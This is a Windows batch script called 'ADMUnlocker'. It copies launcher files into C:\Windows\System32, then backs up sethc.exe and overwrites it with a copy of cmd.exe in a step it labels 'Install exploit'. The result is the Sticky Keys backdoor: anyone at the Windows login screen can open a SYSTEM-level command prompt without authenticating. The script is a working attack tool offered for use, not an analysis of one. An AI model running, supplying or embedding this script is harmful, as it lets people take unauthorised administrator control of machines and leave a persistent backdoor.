@echo off
title ADMUnlocker
color 09
cls


set errors=0
:: Set current path
set cp=%~dp0

echo.
echo.
echo.
echo      ================= ^>     ADMUnlocker (Pre-setup)
echo       ================== ^>       Unlocker by @deepcaps
echo     ============== ^>         github: deepcaps
echo.
echo.

echo [^>] Press enter to continue
echo. 
pause>nul


:: Check if install files is already copied
echo [*] Delete old install files...
if exist C:\Windows\System32\ADMLauncher\ (
    :: Delete old ADMLauncher directory
    del C:\Windows\System32\ADMLauncher\icon.ico
    del C:\Windows\System32\ADMLauncher\ADMLauncher.exe
    rmdir C:\Windows\System32\ADMLauncher\

    del C:\Windows\System32\ADMLauncher.lnk
    del C:\Windows\System32\ADMSetup.exe
)
if %errorlevel% == 0 (
    echo [+] SUCCESS !
) else (
    set /A errors+= 1
    echo [-] Failed to delete files
)
echo.

:: Copy install files
echo [*] Copy install files...
xcopy /I /E %cp%ADMLauncher\ C:\Windows\System32\ADMLauncher\
copy %cp%ADMLauncher.lnk C:\Windows\System32\ADMLauncher.lnk
copy %cp%ADMSetup.exe C:\Windows\System32\ADMSetup.exe
if %errorlevel% == 0 (
    echo [+] SUCCESS !
) else (
    set /A errors += 1
    set errorlevel = 0
    echo [-] Failed to install files
)
echo.

:: Backup "sethc.exe"
echo [*] Check if the backup already exists...
if not exist "C:\Windows\System32\sethc.exe.bak" (
    echo [*] Backup files...
    rename C:\Windows\System32\sethc.exe "sethc.exe.bak"
)
if %errorlevel% == 0 (
    echo [+] SUCCESS !
) else (
    set /A errors+= 1
    echo [-] Failed to backup files
)
echo.

:: Copy exploit file
echo [*] Install exploit...
if exist "C:\Windows\System32\sethc.exe" (
    del C:\Windows\System32\sethc.exe
)
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
if %errorlevel% == 0 (
    echo [+] SUCCESS !
) else (
    set /A errors+= 1
    echo [-] Failed to copy file
)
echo.
echo.


color 0D
echo [+] END OF PROCESS !
echo ERRORS: %errors%/4
echo.
echo Press [ENTER] to exit
pause>nul
color 07
exit